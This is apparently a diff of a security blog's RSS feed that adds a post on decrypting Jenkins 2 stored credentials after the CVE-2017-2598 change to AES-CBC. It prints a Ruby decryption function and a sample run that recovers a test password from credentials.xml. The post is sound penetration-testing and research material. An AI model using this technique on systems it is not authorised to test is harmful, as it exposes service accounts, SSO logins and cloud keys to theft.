@@ -6,8 +6,93 @@
     <description>Recent content on The Subtlety</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 19 Apr 2017 18:19:01 -0700</lastBuildDate>
+    <lastBuildDate>Wed, 21 Jun 2017 23:07:11 -0700</lastBuildDate>
     <atom:link href="https://www.thesubtlety.com/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Decrypting Jenkins 2 Credentials</title>
+      <link>https://www.thesubtlety.com/post/2017-06-21-decrypting-jenkins2-credentials/</link>
+      <pubDate>Wed, 21 Jun 2017 23:07:11 -0700</pubDate>
+      
+      <guid>https://www.thesubtlety.com/post/2017-06-21-decrypting-jenkins2-credentials/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;https://www.thesubtlety.com/img/jenkins.png#floatright&#34; alt=&#34;jenkins&#34; /&gt;
+I like Jenkins. It&amp;rsquo;s a good orchestration tool and provides remote code execution as a service.&lt;/p&gt;
+
+&lt;p&gt;If your user permissions give you access to the script console &lt;code&gt;/script&lt;/code&gt; it&amp;rsquo;s trivial to obtain a shell. The developers explicitly call this out in their &lt;a href=&#34;https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console&#34;&gt;documentation&lt;/a&gt; as well so it&amp;rsquo;s a feature, not a bug.  Of course if you can create a job you can run shell commands as well, but I&amp;rsquo;ll leave that for another time.&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;ve often seen privileged credentials stored here - from developer SSO credentials to service accounts to AWS keys and secrets. Given file system access or backup files with the key material, the encrypted secrets can easily be decrypted. This is pretty common knowledge and a really good write up on decrypting Jenkins credentials is at &lt;a href=&#34;http://xn--thibaud-dya.fr/jenkins_credentials.html&#34;&gt;thiébaud.fr&lt;/a&gt; along with a simple python decrypt &lt;a href=&#34;https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py&#34;&gt;script&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;But there was a recent change to how Jenkins strings are encrypted and the existing decrypt scripts no longer work on Jenkins 2 as of about Jenkins version 2.44 which was released around February 1, 2017. This change was due to the following security advisory &lt;a href=&#34;https://jenkins.io/security/advisory/2017-02-01/&#34;&gt;SECURITY-304&lt;/a&gt; and CVE-2017-2598.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Use of AES ECB block cipher mode without IV for encrypting secrets&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Secrets such as passwords are typically stored on disk and sent to users as part of some pages in encrypted form. These were encrypted using AES-128 ECB without IV, which exposes Jenkins and the stored secrets to unnecessary risks. Jenkins now encrypts secrets using AES-128 CBC with random IV.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The relevant pull request with changes on Github is &lt;a href=&#34;https://github.com/jenkinsci/jenkins/commit/e6aa166246d1734f4798a9e31f78842f4c85c28b&#34;&gt;here&lt;/a&gt;. We see that the &lt;a href=&#34;https://github.com/jenkinsci/jenkins/blob/e6aa166246d1734f4798a9e31f78842f4c85c28b/core/src/main/java/hudson/util/HistoricalSecrets.java&#34;&gt;old encryption function&lt;/a&gt; has been pulled out into HistoricalSecrets.  Let&amp;rsquo;s look at the &lt;a href=&#34;https://github.com/jenkinsci/jenkins/blob/e6aa166246d1734f4798a9e31f78842f4c85c28b/core/src/main/java/hudson/util/Secret.java#L118&#34;&gt;new encryption function&lt;/a&gt;. It now uses CBC instead of ECB and utilizes an IV. The master secret encryption method didn&amp;rsquo;t look to change, but the secrets encryption and decryption methods did.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://www.thesubtlety.com/img/jdiff.png&#34; alt=&#34;diff&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;m partial to Ruby and fortunately we can modify some previous work done by Github user &lt;em&gt;juyeong&lt;/em&gt; who wrote a &lt;a href=&#34;https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c&#34;&gt;decrypt script&lt;/a&gt; in Ruby for the original Jenkins encryption method. If we copy paste the new decrypt function&amp;rsquo;s byte shifting code into that Ruby script we see that it can be used with just a bit of modification. After some slight massaging to get the ciphers working with Ruby, and extracting the IV and encrypted secret I landed on the below. We still use the original ECB decryption function to obtain the decryption key from the &lt;code&gt;master.key&lt;/code&gt; and &lt;code&gt;hudson.util.Secret&lt;/code&gt; files. We then leverage that key to decrypt the encrypted secrets.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;ruby&#34;&gt;
+    def try_decrypt(encrypted,key)
+      encrypted_text = Base64.decode64(encrypted).bytes
+
+      iv_length = ((encrypted_text[1] &amp; 0xff) &lt;&lt; 24) | ((encrypted_text[2] &amp; 0xff) &lt;&lt; 16) | ((encrypted_text[3] &amp; 0xff) &lt;&lt; 8) | (encrypted_text[4] &amp; 0xff)
+      
+      data_length = ((encrypted_text[5] &amp; 0xff) &lt;&lt; 24) | ((encrypted_text[6] &amp; 0xff) &lt;&lt; 16) | ((encrypted_text[7] &amp; 0xff) &lt;&lt; 8) | (encrypted_text[8] &amp; 0xff)
+      
+      if encrypted_text.length != (1 + 8 + iv_length + data_length)
+          abort &#39;invalid encrypted string&#39;
+      end
+      iv = encrypted_text[9..(9 + iv_length)].pack(&#39;C*&#39;)
+      code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack(&#39;C*&#39;)
+
+      cipher = OpenSSL::Cipher.new(&#39;AES-128-CBC&#39;)
+      cipher.decrypt
+      cipher.key = key
+      cipher.iv = iv
+
+      text = cipher.update(code) + cipher.final
+      if text.length == 32 #Guessing API token
+        text = Digest::MD5.new.update(text).hexdigest
+      end
+      text
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So given the &lt;code&gt;master.secret&lt;/code&gt;, the &lt;code&gt;hudson.util.Secret&lt;/code&gt;, and an encrypted string (within &lt;code&gt;credentials.xml&lt;/code&gt; in this case), we can pass those files to the updated script and obtain the plaintext secrets.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;nohighlight&#34;&gt;
+-&amp;gt; % &lt;b&gt;cat credentials.xml&lt;/b&gt;
+&amp;lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&amp;gt;
+&amp;lt;com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin=&#34;credentials@2.1.14&#34;&amp;gt;
+  &amp;lt;domainCredentialsMap class=&#34;hudson.util.CopyOnWriteMap$Hash&#34;&amp;gt;
+    &amp;lt;entry&amp;gt;
+      &amp;lt;com.cloudbees.plugins.credentials.domains.Domain&amp;gt;
+        &amp;lt;specifications/&amp;gt;
+      &amp;lt;/com.cloudbees.plugins.credentials.domains.Domain&amp;gt;
+      &amp;lt;java.util.concurrent.CopyOnWriteArrayList&amp;gt;
+        &amp;lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&amp;gt;
+          &amp;lt;scope&amp;gt;GLOBAL&amp;lt;/scope&amp;gt;
+          &amp;lt;id&amp;gt;2de25363-96dc-495b-b258-1ccb3366f5a6&amp;lt;/id&amp;gt;
+          &amp;lt;description&amp;gt;&amp;lt;/description&amp;gt;
+          &lt;b&gt;&amp;lt;username&amp;gt;testuser&amp;lt;/username&amp;gt;&lt;/b&gt;
+          &lt;b&gt;&amp;lt;password&amp;gt;{AQAAABAAAAAQd42B1h85u14cpl37q0qSekGHvTLrKx0+veCjouoYTGs=}&amp;lt;/password&amp;gt;&lt;/b&gt;
+        &amp;lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&amp;gt;
+      &amp;lt;/java.util.concurrent.CopyOnWriteArrayList&amp;gt;
+    &amp;lt;/entry&amp;gt;
+  &amp;lt;/domainCredentialsMap&amp;gt;
+&amp;lt;/com.cloudbees.plugins.credentials.SystemCredentialsProvider&amp;gt;%              
+
+-&amp;gt; % &lt;b&gt;ruby decrypt_jenkins2.rb master.key hudson.util.Secret credentials.xml
+testuser:Password123&lt;/b&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The full Jenkins 2 decrypt script is up on Github: &lt;a href=&#34;https://gist.github.com/thesubtlety/e7d26891227f0b68b9d5db1ea9870c62&#34;&gt;https://gist.github.com/thesubtlety/e7d26891227f0b68b9d5db1ea9870c62&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Using subTee&#39;s katz to Reflectively Load an exe</title>
@@ -1035,18 +1120,6 @@ MAC Address: B8:27:EB:33:BE:85 (Raspberry Pi Foundation)
 
 &lt;li&gt;&lt;p&gt;Happiness will not be dominated by your career. Work to live.&lt;/p&gt;&lt;/li&gt;
 &lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Rob Fuller on Getting a Job in InfoSec</title>
-      <link>https://www.thesubtlety.com/post/rob-fuller-on-getting-a-job-in-infosec/</link>
-      <pubDate>Fri, 22 Feb 2013 01:12:37 +0000</pubDate>
-      
-      <guid>https://www.thesubtlety.com/post/rob-fuller-on-getting-a-job-in-infosec/</guid>
-      <description>&lt;p&gt;I was fortunate enough to get a good job in IT right out of college. Not in InfoSec, but in telecom, and in specific, service delivery. I&amp;rsquo;m learning an incredible amount - from enterprise telephony environment to working in a highly complex work environment to leading delivery on new intent projects. But it&amp;rsquo;s not InfoSec.&lt;/p&gt;
-
-&lt;p&gt;In my search for ways to break into InfoSec, I&amp;rsquo;ve come across numerous &lt;a href=&#34;https://www.schneier.com/blog/archives/2012/07/how_to_become_a_1.html&#34;&gt;posts&lt;/a&gt;, &lt;a href=&#34;http://pauldotcom.com/2009/05/getting-started-in-information.html&#34;&gt;advice&lt;/a&gt;, and &lt;a href=&#34;https://krebsonsecurity.com/category/how-to-break-into-security/&#34;&gt;tips&lt;/a&gt; to do just that. And this is great stuff - I&amp;rsquo;m working on the learning and the doing covered in those posts. But I really enjoyed the clear, common sense advice on building a  resume, the job search, interview techniques, brand building, and general career advice given by Rob Fuller. Watch the presentation &lt;a href=&#34;http://vimeo.com/4108726&#34;&gt;here&lt;/a&gt;. (About 50 minutes)&lt;/p&gt;
 </description>
     </item>
     
